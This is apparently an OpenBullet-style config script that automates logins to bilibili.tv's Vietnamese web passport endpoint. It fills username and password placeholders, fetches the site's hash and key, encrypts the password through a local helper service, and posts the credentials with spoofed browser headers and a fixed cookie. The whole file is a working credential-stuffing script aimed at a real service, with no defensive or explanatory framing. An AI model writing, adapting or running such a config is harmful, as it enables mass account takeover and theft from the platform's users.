FUNCTION URLEncode "<USER>" -> VAR "US" 

REQUEST GET "https://passport.bilibili.tv/x/intl/passport-login/web/key?s_locale=vi_VN&platform=web" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

PARSE "<SOURCE>" JSON "hash" -> VAR "hash" 

PARSE "<SOURCE>" JSON "key" -> VAR "key" 

FUNCTION URLEncode "<key>" -> VAR "keyEC" 


REQUEST POST "http://127.0.0.1:5000/encrypt" 
  CONTENT "{\"password\": \"<PASS>\", \"hash_value\": \"<hash>\", \"key\": \"<keyEC>\"}" 
  CONTENTTYPE "application/json" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

PARSE "<SOURCE>" JSON "encrypted_data" -> VAR "encrypted_password" 

FUNCTION URLEncode "<encrypted_password>" -> VAR "PS" 

REQUEST POST "https://passport.bilibili.tv/x/intl/passport-login/web/login/password?s_locale=vi_VN&platform=web" 
  CONTENT "username=<US>&password=<PS>&keep_me=true&go_url=https%3A%2F%2Fwww.bilibili.tv%2Fvi" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "accept: application/json, text/plain, */*" 
  HEADER "accept-language: en-US,en;q=0.9,vi;q=0.8" 
  HEADER "cache-control: no-cache" 
  HEADER "content-type: application/x-www-form-urlencoded" 
  HEADER "cookie: buvid3=99b30662-148f-4acd-876f-4d3150924c0357300infoc; bstar-web-lang=vi" 
  HEADER "origin: https://www.bilibili.tv" 
  HEADER "pragma: no-cache" 
  HEADER "priority: u=1, i" 
  HEADER "referer: https://www.bilibili.tv/vi" 
  HEADER "sec-ch-ua: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"" 
  HEADER "sec-ch-ua-mobile: ?1" 
  HEADER "sec-ch-ua-platform: \"Android\"" 
  HEADER "sec-fetch-dest: empty" 
  HEADER "sec-fetch-mode: cors" 
  HEADER "sec-fetch-site: same-site" 
  HEADER "user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36" 
